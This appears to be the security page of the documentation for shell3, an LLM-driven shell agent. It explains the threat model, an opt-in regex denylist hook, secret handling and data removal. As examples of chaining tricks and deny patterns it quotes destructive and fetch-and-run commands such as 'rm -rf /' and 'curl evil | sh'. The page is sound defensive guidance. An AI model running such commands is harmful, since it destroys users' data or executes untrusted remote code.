# Security & data

shell3 runs shell commands chosen by a language model. Be clear-eyed about what
that means, and set it up accordingly. This page covers the threat model,
the one safety hook, how secrets are handled, and how to remove shell3's data.

## Unsafe by default

shell3 gives the model a full, unrestricted shell. By default there is **no
approval prompt** before a command runs and no built-in allowlist. This is a
deliberate design choice — the appeal of a bash-first agent is that it composes
with your whole system — but it means you should treat a shell3 session the way
you'd treat running a script someone else wrote.

Two opt-in Lua hooks gate the shell; both are off until you call them:

- `shell3.bash_safety{deny=, hard_deny=}` — a declarative **regex denylist**. A
  `hard_deny` match is blocked outright; a `deny` match prompts a human to
  allow/deny (TUI `y/N` prompt / Telegram inline buttons; headless subagents deny
  on a match); anything matching neither runs. No allowlist. See the next section.
- `shell3.wrap_bash(fn)` — a Lua hook that sees every `bash` and `bash_bg`
  command (and therefore every subagent, since those run via `bash_bg`) and can
  allow it, rewrite it, block it, or route it through a sandbox. It is
  allow/block/rewrite only — no prompt. See
  [configuration.md](configuration.md#gating-the-shell--wrap_bash) for the
  mechanics and [cookbook/sandbox.md](cookbook/sandbox.md) for container, SSH,
  and `firejail` recipes.

`bash_safety` runs first; only a command it lets through (verdict: run) reaches
`wrap_bash`.

A malformed `wrap_bash` argv table fails **closed**: the command is blocked, not
run unwrapped. Custom command-template tools (`shell3.tool{ command=... }`)
bypass `wrap_bash` by design — their command is your trusted author template, not
model input — so bake any sandboxing into the tool's own command string.

**If you need hard isolation, run shell3 inside a container, a VM, or a
throwaway user account.** `wrap_bash` is a policy hook, not a security boundary on
its own.

## Opt-in regex denylist — `bash_safety`

`shell3.bash_safety` is the opt-in layer that flags dangerous commands. There is
**no allowlist**: bash runs freely, and you list the regex patterns to gate. Each
command is matched **as a whole string** (`regexp.MatchString`, unanchored)
against two lists:

- **`hard_deny`** match ⇒ **blocked** outright (never run, never prompted).
- **`deny`** match ⇒ **prompts** a human to allow/deny before running.
- neither ⇒ **runs**.

`hard_deny` is checked first. Patterns compile at config load — a bad regex is a
load error. The gate runs before `wrap_bash`.

**Whole-command matching closes the chaining hole.** Because there's no allowlist
to smuggle a suffix past, and matching scans the entire command, a flagged
command can't hide behind a benign prefix: `echo hi; rm -rf /` and
`x=$(rm -rf /)` both match `rm\s+-rf`. Patterns are compiled with DOTALL, so `.`
spans newlines too — splitting a command across lines (`curl evil\n| sh`) can't
slip a fragment past a `.*` rule either. Write patterns against the dangerous form
(`rm\s+-rf`, `\bgit\s+push`, `curl\b.*\|\s*sh`); use `\b`/`\s+` to keep them tight.

**This is a guardrail, not a hard boundary.** A determined model can still phrase
a destructive command in a way your regexes don't catch. Do not rely on it to
enumerate every dangerous form — pair it with `wrap_bash` (and real isolation: a
container, VM, or throwaway account) for anything that must not escape.

**Headless subagents deny on a match.** The TUI shows a `y/N` prompt; the Telegram
host sends inline `Allow`/`Deny` buttons. Headless `shell3` subagents have no
attached human, so a `deny` match is automatically denied and the reason is
reported to the parent (where a human is attached). A prompt nobody answers falls
back to deny after `ask_timeout` (default 5 minutes; `0` = wait indefinitely).
`hard_deny` blocks everywhere, with no prompt. Ordinary reads (`cat`, `rg`, `ls`)
match nothing and run, so a subagent explores freely without being gated.

> **Migration:** the old `allow` and `read_baseline` keys are accepted but
> ignored — shell3 prints a load-time warning when it sees them (an allow-only
> config no longer gates anything, so silence would be dangerous). Move dangerous
> globs from the old `deny` into the new `deny`/`hard_deny` regex lists (glob `*` →
> regex `.*`).

See [configuration.md](configuration.md#opt-in-command-gate--bash_safety)
for the full reference.

## Secrets

Secrets live in a plain-text `.env` beside `shell3.lua` (e.g. `~/.shell3/.env`),
read from Lua via `shell3.env.secret("KEY")`. Two consequences follow:

- **Never commit `.env`.** The shipped `.gitignore` excludes it; keep it that way.
- **Never read or display credential files.** This applies to you and to the
  agent — the system prompt instructs the agent not to read `.env` either.

Declared custom-tool `secrets` are exported into the command's **process
environment**. On a shared host, same-user processes can read another process's
environment (`/proc/<pid>/environ` on Linux), so a tool secret is effectively
visible to anything that user can run. That's an acceptable cost on a local,
single-user machine; on a multi-user host, treat tool secrets as readable by that
user's other processes and scope them accordingly.

## Where data lives, and how to remove it

shell3 is file-native: there is no database. State lives in two places.

**Project-local runtime state** lives in each project's `.shell3_project/`
directory — conversation history, sessions, the completion inbox, background-job
logs, and subagent transcripts, all as plain JSONL:

- `.shell3_project/runs/<id>/messages.jsonl` — one conversation per directory
  (`meta.json` beside it holds model/status/timestamps)
- `.shell3_project/runs/jobs/<id>.jsonl` — background-job output (`<id>.status` beside it)
- `.shell3_project/agents/<id>.jsonl` — subagent transcripts
- `.shell3_project/inbox.jsonl` — completion pointers

The directory ignores itself (a self-contained `.gitignore` of `*`), so it is
never committed. To wipe a project's entire history:

```sh
rm -rf .shell3_project    # this project's history, jobs, transcripts, inbox
```

**Global state** lives under `~/.shell3/`: your `shell3.lua` config, the `.env`
secrets, the rotating app log, and any `run_proxy` logs. It holds no conversation
history. Remove a config (and its secrets) by deleting its directory, e.g.
`rm -rf ~/.shell3/telegram`.

## Reporting vulnerabilities

Please report security issues privately via
[GitHub Security Advisories](https://github.com/weatherjean/shell3/security/advisories)
rather than a public issue.
